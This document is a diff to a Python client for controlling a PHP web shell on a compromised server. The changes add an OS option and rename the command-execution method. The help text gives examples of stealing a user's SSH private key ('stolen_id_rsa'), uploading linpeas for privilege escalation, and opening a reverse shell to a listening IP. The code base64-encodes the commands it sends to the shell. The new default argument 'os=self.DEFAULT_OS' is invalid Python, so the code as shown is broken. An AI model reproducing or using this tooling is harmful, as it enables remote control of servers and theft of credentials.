@@ -10,13 +10,15 @@ basepath = os.path.dirname(os.path.abspath(__file__))
 
 class PHP_Web_Shell_Handler:
     DEFAULT_WEBSHELL_PARAM = "phpshellcmd"
+    DEFAULT_OS = "UNIX"
+
     UPLOAD_HELP = "\n\t[ UPLOAD ] - 'upload localfilepath remotefilepath' - uploads a file to the server, from 'localfilepath' on your machine, to 'remotefilepath' on the remote machine\n" + "\tEXAMPLE: upload /opt/linpeas.sh /tmp/linpeas.sh"
     DOWNLOAD_HELP = "\n\t[ DOWNLOAD ] - 'download remotefilepath localfilepath' - downloads a file from the server, from 'remotefilepath' on the target machine, to 'localfilepath' on your machine\n" + "\tEXAMPLE: download /home/user/.ssh/id_rsa /home/watchdog/stolen_id_rsa"
     SWITCHSHELL_HELP = "\n\t[ SWITCHSHELL ] - ' new_shellfile' - switches the file currently used by the shell handler to a new file (often used for switching between encoded and non encoded shells)\n" + "\tEXAMPLE: switchshell /path/to/newshell.php"
     SHELL_HELP = "\n\t[ SHELL ] - 'shell listening_ip listening_port' - attempts to run a reverse shell to give shell access to listening_ip on listening_port\n" + "\tEXAMPLE: shell 10.10.10.10 9001"
     QUIT_HELP = "\n\t[ QUIT (or EXIT) ] - 'quit' - quits the current session and exits the program (also works with 'exit')\n"
 
-    def __init__(self, webshell_url, webshell_param=None, encoded=True):
+    def __init__(self, webshell_url, webshell_param=None, encoded=True, os=self.DEFAULT_OS):
         try:
             webshell_url = web_utils.validate_url(webshell_url)
             if '/' not in webshell_url or not webshell_url.endswith('.php'):
@@ -33,6 +35,11 @@ class PHP_Web_Shell_Handler:
             webshell_param = self.DEFAULT_WEBSHELL_PARAM
         self.webshell_param = webshell_param
         self.encoded = encoded
+        if os.upper() != "WINDOWS" and os.upper() != "UNIX":
+            print("[-] - The provided OS is not UNIX or WINDOWS... Defaulting to UNIX")
+            self.os = self.DEFAULT_OS
+        else:
+            self.os = os            
 
     def _encode_cmd(self, cmd):
         encoded_cmd = b64encode(cmd.encode()).decode()
@@ -46,7 +53,7 @@ class PHP_Web_Shell_Handler:
 
         return decoded_result
 
-    def _exec_cmd(self, cmd):
+    def exec_cmd(self, cmd):
         if self.encoded:
             cmd = self._encode_cmd(cmd)
         if len(cmd) < 2048:
@@ -84,11 +91,11 @@ class PHP_Web_Shell_Handler:
         if file_contents:
             encoded_file_contents = b64encode(file_contents.encode()).decode()
             upload_command = f"echo {encoded_file_contents} | base64 -d > {remote_filepath}"
-            self._exec_cmd(upload_command)
+            self.exec_cmd(upload_command)
 
             check_upload_cmd = f"cat {remote_filepath}"
             
-            if file_contents in self._exec_cmd(check_upload_cmd):
+            if file_contents in self.exec_cmd(check_upload_cmd):
                 print(f"[+] - '{local_filepath}'' UPLOADED TO '{remote_filepath}'' ON THE REMOTE SERVER!")
             else:
                 print(f"[?] - '{local_filepath}'' MAY BE UPLOADED to '{remote_filepath}'' ON THE REMOTE SERVER... RUN 'cat {remote_filepath}' TO VALIDATE (AUTO CHECKING FAILED)")
@@ -178,4 +185,4 @@ class PHP_Web_Shell_Handler:
                 sys.exit(1)
 
             else:
-                print(self._exec_cmd(cmd))
+                print(self.exec_cmd(cmd))
